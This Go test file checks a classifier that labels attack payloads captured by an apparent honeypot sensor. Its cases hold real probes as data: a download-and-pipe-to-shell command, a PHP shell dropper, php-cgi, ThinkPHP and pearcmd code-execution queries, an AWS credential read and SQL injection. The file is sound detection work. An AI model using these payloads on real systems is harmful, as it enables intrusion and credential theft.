package main

import (
	"strings"
	"testing"
)

// TestClassifyPayloadOnRealCorpus runs the classifier over payloads taken
// from the fleet's own 30-day window (#1888), rather than over invented
// strings that would only prove the patterns match themselves.
//
// The bodies are truncated where they were long; each is kept exactly as
// it arrived up to that point, because the encoding variations are the
// part that breaks naive matching.
func TestClassifyPayloadOnRealCorpus(t *testing.T) {
	cases := []struct {
		name  string
		query string
		body  string
		want  string
	}{
		// 2,917 events -- a third of every body seen, one probe.
		{
			name: "CVE-2017-9841 PHPUnit eval-stdin",
			body: `<?php echo(md5("Hello PHPUnit"));`,
			want: "php-code",
		},
		// 335 + 50 events. A <?php wrapper around base64 that decodes to a
		// wget|sh chain -- three classes nested, and the outermost shape
		// has to win or the count lands in the wrong bucket.
		{
			name: "base64 shell_exec dropper",
			body: `<?php shell_exec(base64_decode("Y2QgL3RtcCB8fCBjZCAvdmFyL3RtcCB8fCBjZCAvZGV2L3NobTs="));`,
			want: "php-base64-shell",
		},
		// 58 events, the same chain unwrapped.
		{
			name: "wget-or-curl piped to sh",
			body: `(wget --no-check-certificate -qO- https://203.0.113.9/sh || curl -sk https://203.0.113.9/sh) | sh -s apache`,
			want: "downloader",
		},
		// 390 events across three encodings of one probe. The %AD and
		// %25AD forms are why matching happens after decoding.
		{
			name:  "php-cgi argument injection, %AD form",
			query: `%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input`,
			want:  "php-cgi-argument-injection",
		},
		{
			name:  "php-cgi argument injection, double-encoded",
			query: `%25ADd+allow_url_include%3D1+%25ADd+auto_prepend_file%3Dphp://input`,
			want:  "php-cgi-argument-injection",
		},
		{
			name:  "php-cgi argument injection, plain",
			query: `-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input`,
			want:  "php-cgi-argument-injection",
		},
		// 162 events.
		{
			name:  "ThinkPHP invokefunction",
			query: `s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello`,
			want:  "thinkphp-rce",
		},
		// 81 events -- traversal used to reach PEAR, then told to write a
		// PHP file. Must not be filed as plain traversal.
		{
			name:  "pearcmd config-create",
			query: `lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"))&?>+/tmp/index1.php`,
			want:  "pearcmd-rce",
		},
		// 81 events. Same traversal without the escalation.
		{
			name:  "bare traversal",
			query: `lang=../../../../../../../../tmp/index1`,
			want:  "path-traversal",
		},
		// 26 events. Both a command injection and a credential read; the
		// mechanism wins over the target, because "they can run commands"
		// is the more actionable half and the raw query still names the
		// file.
		{
			name:  "cat of AWS credentials through cmd=",
			query: `cmd=cat%20/root/.aws/credentials`,
			want:  "command-injection",
		},
		// The same target without execution, which is what secret-read is
		// for.
		{
			name:  "credential file read by path",
			query: `file=/root/.aws/credentials`,
			want:  "secret-read",
		},
		// 171 events across three password variants of one probe.
		{
			name: "administrator account creation",
			body: `{"Name": "lan test", "Description": "lan test", "Enabled": true, "Password": "+Y{BI~\"&|qp8", "RoleId": "Administrator", "Locked": false}`,
			want: "admin-account-create",
		},
		// 50 events -- ONVIF camera discovery.
		{
			name: "SOAP ONVIF probe",
			body: `<?xml version="1.0" encoding="UTF-8"?><env:Envelope xmlns:env="http://www.w3.org/2003/05/soap-envelope" xmlns:tds="http://www.onvif.org/ver10/device/wsdl">`,
			want: "soap-probe",
		},
		// 35 events, in the query rather than a body.
		{
			name:  "androxgh0st marker",
			query: `0x%5B%5D=androxgh0st`,
			want:  "androxgh0st",
		},
		// 372 events.
		{
			name:  "WordPress REST enumeration",
			query: `rest_route=/gravitysmtp/v1/tests/mock-data&page=gravitysmtp-settings`,
			want:  "wordpress-rest-probe",
		},
		// 19 events, and the reason the distinct-body count reads high:
		// every one of these differs only in its random boundary.
		{
			name: "prototype pollution through multipart",
			body: "------WebKitFormBoundary2906f9affd539b16\nContent-Disposition: form-data; name=\"0\"\n\n{\"then\":\"$1:__proto__:then\",\"status\":\"resolved_model\"}",
			want: "prototype-pollution",
		},
		{
			name: "multipart padding",
			body: "------WebKitFormBoundary0l0DxKbGCnFnLnh9uOlWuP6x\nContent-Disposition: form-data; name=\"junk\"\n\n" + strings.Repeat("A", 200),
			want: "multipart-padding",
		},
		// 116 events, and not the benign JSON it looks like: this is the
		// empty form of WordPress's /batch/v1 multiplexer being probed for
		// existence, before the populated version below is sent.
		{
			name: "batch multiplexer probe, empty",
			body: `{"requests":[]}`,
			want: "batch-request-probe",
		},
		// 21 events. The same endpoint asked to call itself.
		{
			name: "batch multiplexer probe, populated",
			body: `{"requests":[{"method":"POST","path":"http:///x"},{"method":"GET","path":"/wp/v2/posts"}]}`,
			want: "batch-request-probe",
		},
		// 178 events. A DNS CHAOS query aimed at a web port by scanners
		// that fan one probe across every protocol they know.
		{
			name:  "version.bind at an HTTP port",
			query: `version.bind`,
			want:  "dns-version-probe",
		},
		// 371 events across 70 hostnames. A query that is only a hostname
		// is an open-resolver or open-proxy test.
		{
			name:  "bare hostname as the whole query",
			query: `ip.parrotdns.com`,
			want:  "open-resolver-probe",
		},
		// 44 events. JSON-RPC initialize carrying a protocolVersion is the
		// Model Context Protocol handshake -- scanners hunting exposed MCP
		// servers, which is new traffic rather than a legacy exploit.
		{
			name: "MCP handshake",
			body: `{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-03-26","capabilities":{}}}`,
			want: "mcp-probe",
		},
		// 38 events.
		{
			name: "mining RPC probe",
			body: `{"id": 1, "method": "eth_getWork", "params": []}`,
			want: "mining-rpc-probe",
		},
		// 19 events. Cisco AnyConnect's opening exchange.
		{
			name: "VPN handshake at a web port",
			body: `<config-auth client="vpn" type="init" aggregate-auth-version="2">`,
			want: "vpn-handshake",
		},
		// 38 events, and valid UTF-8 -- which is why utf8.ValidString on
		// its own was not enough to notice this is not text.
		{
			name: "binary protocol that is still valid UTF-8",
			body: "\x00\x00\x00\x00\x03:\x01*",
			want: "binary-protocol",
		},
		{
			name: "nothing at all",
			want: "",
		},
		{
			name:  "ordinary query",
			query: `format=json`,
			want:  "",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := classifyPayload(tc.query, tc.body); got != tc.want {
				t.Fatalf("classifyPayload() = %q, want %q", got, tc.want)
			}
		})
	}
}

// TestClassifyPayloadIsSeparateFromCategory covers #1809's opening case:
// an SQL injection posted to a WordPress bait path is both things, and
// neither field may overwrite the other.
func TestClassifyPayloadIsSeparateFromCategory(t *testing.T) {
	const path = "/wp-login.php"
	const body = `log=admin&pwd=x' or 1=1--`

	if got := classify(path); got != "wordpress" {
		t.Fatalf("classify(%q) = %q, want %q", path, got, "wordpress")
	}
	if got := classifyPayload("", body); got != "sqli" {
		t.Fatalf("classifyPayload() = %q, want %q", got, "sqli")
	}
}

// TestClassifyPayloadDoesNotLabelOrdinaryTraffic guards the failure mode
// that matters most here. A classifier that fires on ordinary requests
// makes every event look interesting, which is the same as none of them
// being interesting.
func TestClassifyPayloadDoesNotLabelOrdinaryTraffic(t *testing.T) {
	ordinary := []struct{ query, body string }{
		{query: "page=2&sort=name"},
		{body: `{"username":"alice","remember":true}`},
		{body: `<!DOCTYPE html><html><body>hello</body></html>`},
		{body: `name=Bob&comment=I+ran+into+trouble+with+the+system`},
		{query: "redirect=/dashboard"},
		{body: `{"template":"{{name}}"}`},
	}

	for _, tc := range ordinary {
		if got := classifyPayload(tc.query, tc.body); got != "" {
			t.Errorf("classifyPayload(%q, %q) = %q, want no label", tc.query, tc.body, got)
		}
	}
}

// TestClassifyPayloadBinaryProtocol covers the sensor being spoken to in
// something other than HTTP -- a TLS ClientHello at a plaintext port is
// the usual one, and it arrives as invalid UTF-8 rather than as text.
func TestClassifyPayloadBinaryProtocol(t *testing.T) {
	clientHello := "\x16\x03\x01\x00\xee\x01\x00\x00\xea\x03\x03\xc8\xf7"

	if got := classifyPayload("", clientHello); got != "binary-protocol" {
		t.Fatalf("classifyPayload() = %q, want %q", got, "binary-protocol")
	}
}

// TestPhpSerializedObject covers the header match not firing on prose that
// merely contains "o:".
func TestPhpSerializedObject(t *testing.T) {
	if !phpSerializedObject(`o:8:"stdclass":1:{s:1:"a";i:1;}`) {
		t.Fatal("a real serialize() header must match")
	}
	if phpSerializedObject("subject: hello") {
		t.Fatal("ordinary prose must not match")
	}
	if phpSerializedObject(`o:"notalength"`) {
		t.Fatal("the length is what makes it a header")
	}
}
